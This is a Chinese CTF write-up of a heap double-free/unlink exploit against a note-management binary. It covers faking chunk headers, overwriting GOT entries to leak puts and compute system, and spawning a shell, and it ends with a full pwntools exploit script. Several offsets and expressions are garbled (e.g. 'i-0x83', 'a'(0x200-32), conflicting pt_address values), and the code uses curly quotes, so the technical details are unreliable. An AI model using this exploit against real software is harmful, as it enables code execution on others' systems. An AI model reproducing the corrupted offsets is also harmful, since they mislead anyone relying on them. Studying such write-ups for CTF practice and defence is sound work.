用IDA打开在delete函数里(如下图）可以发现在free时没有检查堆快是否存在，而且free后没有将指针置为NULL,并且指针存放在（0x6020E0+0x10index)中，这样就有了double free的可能.

double free利用的关键:
第二次free某块堆快时如果检测到前一块堆快是空闲状态，这个时候就会发生堆快的合并其中会通过Unlink宏把前一块堆快从链表中取下，进行unlink操作：
{
bk=bk->fd;
fd->bk=bk;
}
如果前一块堆快的fFD,BK是伪造的，那么这个操作就是两次的任意地址写。但是触发unlink时有一段这样的检验:
if (builtin_expect (FD->bk != P || BK->fd != P, 0))
malloc_printerr (check_action, “corrupted double-linked list”, P, AV);
如果在某个地址 i 处存在一个指向前一块堆快块首的指针p，我们令FD=i-0x83,BK=i-0x82,这样FD->bk==BK->fd==i==p.就可以过掉这一段的检验。
这样构造，进行unlink操作后，地址i处存放的值就会变成 i-0x83，这时候对i处进行edit操作就可以为所欲为
1：我们可以先malloc两块大于0x80堆块，再释放掉（小于0x80分配的是fastbin，fastbin是单链表无法在Unlink时利用)，这里选在第一次malloc0x200(addnote(1,0x200,”aaaaaaa”))，第二次malloc0x300(addnote(2,0x300,”aaaaaaa”))
2：这时候释放掉2块堆快，因为是连续分配的地址连续会发生堆快的合并。这样我们第三次分配堆快时堆快的位置就是第一次分配的堆快的位置
3：分配第三块堆快，大小只要大于第一次分配的堆快大小+0x10即可(因为实现double free需要伪造第二块堆快的堆头）,这里为了方便，选择(addnote(1,0x500，payload))，但分配的堆快下标一定要是1
4: 构造payload：
这里构造的payload如下:
payload=p64(0x0)+p64(0x200+1)+p64(pt_address-0x83)+p64(pt_address-0x82)+’a’(0x200-32) 堆快一
+p64(0x200)+p64(0x100)+’a’(0x100-16) 堆快二
+p64(0)+p64(0x101)+’a’(0x100-16) 堆快三
+p64(0x0)+p64(0x111) 堆快四 #有更简单的版本，但是这样构造有助于理解
pt_adddress=0x6020E0+0x10
1、
因为在(0x6020E0+0x102)处存在着指向堆块二块身的指针我们delete(2)进行第二次free堆快二。
这时会先检查是否能向后合并即检查堆快三是否是空闲的，通过检查堆块四的flag标志位来判断，由于我们伪造的堆快四的flag标志位是1所以判定堆块三是活动的无法向后合并。
然后会检查是否能向前合并，因为自身的flag标志位为0判定能向前合并，同时由于堆快二块首处prev_size大小为0x200所以会判定我们伪造的堆快一是前一块堆快并想要通过unlink操作
将堆快一从双向链表中脱离出来，由于我们的pt_address指向的是伪造的堆快一的块首(真正的前一块堆块的块身),所以可以过掉前面讲的Unlink时的检验进行赋值操作，最后的结果就是
pt_address中的值被改写为pt_address-0x83就可以进行我们想要的操作了
5、leak system_addr
因为edit()时会检查堆快是否存在，所以想要对pt_address处的指针进行edit操作的话，我们在3中分配的大小为0x500的堆快的下标一定要是1
我们通过改写0x6020E0处的值为elf.got[‘free’]再edit 0x6020E0处的指针为elf.symbols[‘puts’] ,改写0x6020E0+0x10出的值为elf.got[‘puts’],这样再delete(1)就可以leak出puts函数的地址再通过计算就可以得到system函数的地址(这里注意的是0x6020E0处分配的堆块零的大小一定要是8，因为read函数会把换行符读取进来，如果大于8换行符会覆盖got表中下一个函数的最低位造成错误)
6、getshell
再次edit(0)，把got表中free函数的地址覆盖为我们leak处的system函数的地址
这时分配一个堆快4的内容为/bin/sh
delete(4)就可以getshell 了

下面是完整的exp：
from pwn import *
f = process(‘./first’)
elf1=ELF(‘./first’)
elf2=ELF(‘libc.so.6’)
def addnote(num,size,content=””):
f.sendline(“1”)
print(f.recv())
f.sendline(str(size))
print(f.recv())
f.sendline(str(num))
print(f.recv())
f.sendline(content)
print(f.recv())
def deletenote(num):
f.sendline(“2”)
print(f.recv())
f.sendline(str(num))
print(f.recv())
def editnote(num,sentence):
f.sendline(“3”)
print(f.recv())
f.sendline(str(num))
print(f.recv())
f.sendline(sentence)
print(f.recv())

f.sendline(“baba”)
f.recv()
addnote(0,0x8,”xxxxxx”)
addnote(1,0x200,”aaaaaaa”)
addnote(2,0x300,”aaaaaaa”)
addnote(3,0x30,”/bin/sh\0”)
deletenote(1)
deletenote(2) #exit a pt in 0x100
pt_address=0x6020E0+0x101
payload=p64(0x0)+p64(0x200+1)+p64(pt_address-0x83)+p64(pt_address-0x82)+’a’(0x200-32)+p64(0x200)+p64(0x100)+’a’(0x100-16)+p64(0)+p64(0x101)+’a’(0x100-16)+p64(0x0)+p64(0x111)
addnote(1,0x500,payload)
deletenote(2) #double free; pt_address=pt_address-0x8*3

#gdb.attach(proc.pidof(f)[0])
payload=p64(1)+p64(elf1.got[‘free’])+p64(1)+p64(elf1.got[‘puts’])+p64(1)#got[free]=got[system]
editnote(1,payload)
editnote(0,p64(elf1.symbols[‘puts’]))

#deletenote(0)
f.sendline(“2”)
print(f.recv())
f.sendline(str(1))
puts_addr=f.recvuntil(‘\n’)
puts_addr=puts_addr.replace(“\n”,””)
puts_addr=u64(puts_addr+(8-len(puts_addr))*”\x00”)
system_addr=elf2.symbols[‘system’]+puts_addr-elf2.symbols[‘puts’]
editnote(0,p64(system_addr))
f.interactive()
